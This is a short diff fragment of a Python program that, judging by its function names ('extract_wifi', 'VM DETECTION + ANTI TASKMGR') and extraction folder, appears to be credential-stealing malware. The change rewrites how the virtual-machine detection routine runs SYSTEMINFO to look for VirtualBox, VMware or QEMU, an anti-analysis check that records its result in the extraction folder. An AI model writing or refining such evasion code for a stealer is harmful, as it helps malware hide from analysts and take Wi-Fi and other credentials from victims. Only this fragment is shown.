@@ -125,7 +125,7 @@ def extract_wifi():
 # === VM DETECTION + ANTI TASKMGR ===
 def detect_vm():
     indicators = ["VirtualBox", "VMware", "QEMU"]
-    sysinfo = subprocess.getoutput("SYSTEMINFO")
+    sysinfo = subprocess.check_output("SYSTEMINFO", shell=True).decode("utf-8", errors="ignore")
     for i in indicators:
         if i.lower() in sysinfo.lower():
             with open(os.path.join(EXTRACT_FOLDER, "vm_detected.txt"), "w", encoding="utf-8", errors="ignore") as f:
@@ -696,6 +696,7 @@ def run():
 
 if __name__ == "__main__":
     run()
+
 
 
 
